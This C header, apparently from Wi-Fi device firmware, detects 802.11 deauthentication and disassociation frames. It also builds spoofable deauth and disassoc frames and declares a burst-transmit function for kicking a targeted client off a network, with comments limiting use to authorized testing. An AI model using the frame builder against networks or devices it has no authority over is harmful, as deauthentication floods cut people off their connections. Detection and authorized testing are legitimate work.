// Pure 802.11 deauth/disassoc frame check — host-testable.
// Frame-control byte 0 = subtype(4) | type(2) | version(2). A deauth attack
// floods management frames: deauth subtype 1100 -> 0xC0, disassoc 1010 -> 0xA0.
#pragma once
#include <stdint.h>
#include <stddef.h>

static inline bool is_deauth(const uint8_t *frame, size_t len) {
  if (!frame || len < 1) return false;
  uint8_t fc = frame[0];
  return fc == 0xC0 || fc == 0xA0;   // deauth or disassoc
}

// Build an 802.11 deauth/disassoc management frame (26 bytes). fc0 selects the
// subtype (0xC0 deauth, 0xA0 disassoc). addr1=destination, addr2=source,
// addr3=BSSID. reason is little-endian (7 = "class-3 frame from nonassociated
// STA"). For authorized testing of your OWN network/client only — targeted, not
// a mass jammer. The RF transmit is bring-up (wifi_deauth_tx).
#define DEAUTH_FRAME_LEN 26
static inline void mgmt_kick_frame(uint8_t fc0, const uint8_t dst[6],
                                   const uint8_t src[6], const uint8_t bssid[6],
                                   uint16_t reason, uint8_t out[DEAUTH_FRAME_LEN]) {
  out[0] = fc0;  out[1] = 0x00;               // frame control (subtype), no flags
  out[2] = 0x00; out[3] = 0x00;               // duration
  for (int i = 0; i < 6; i++) out[4 + i]  = dst[i];    // addr1 = destination
  for (int i = 0; i < 6; i++) out[10 + i] = src[i];    // addr2 = source
  for (int i = 0; i < 6; i++) out[16 + i] = bssid[i];  // addr3 = BSSID
  out[22] = 0x00; out[23] = 0x00;             // sequence control
  out[24] = (uint8_t)(reason & 0xFF);
  out[25] = (uint8_t)(reason >> 8);
}
// Deauth (0xC0) / disassoc (0xA0) with an explicit source — real tools send both,
// and in both directions (AP->client and client->AP) for a hard targeted kick.
static inline void deauth_frame_ex(const uint8_t dst[6], const uint8_t src[6],
                                   const uint8_t bssid[6], uint16_t reason,
                                   uint8_t out[DEAUTH_FRAME_LEN]) {
  mgmt_kick_frame(0xC0, dst, src, bssid, reason, out);
}
static inline void disassoc_frame_ex(const uint8_t dst[6], const uint8_t src[6],
                                     const uint8_t bssid[6], uint16_t reason,
                                     uint8_t out[DEAUTH_FRAME_LEN]) {
  mgmt_kick_frame(0xA0, dst, src, bssid, reason, out);
}
// Back-compat: AP->client deauth (source = BSSID).
static inline void deauth_frame(const uint8_t dst[6], const uint8_t bssid[6],
                                uint16_t reason, uint8_t out[DEAUTH_FRAME_LEN]) {
  deauth_frame_ex(dst, bssid, bssid, reason, out);
}

// Hardware side (deauth_detect.cpp): promiscuous-mode monitor + authorized TX.
void     deauth_begin();
bool     deauth_active();
uint32_t deauth_count();
// Transmit `bursts` deauth frames at the target. Authorized use only; bring-up.
bool     wifi_deauth_tx(const uint8_t dst[6], const uint8_t bssid[6],
                        uint16_t reason, int bursts);
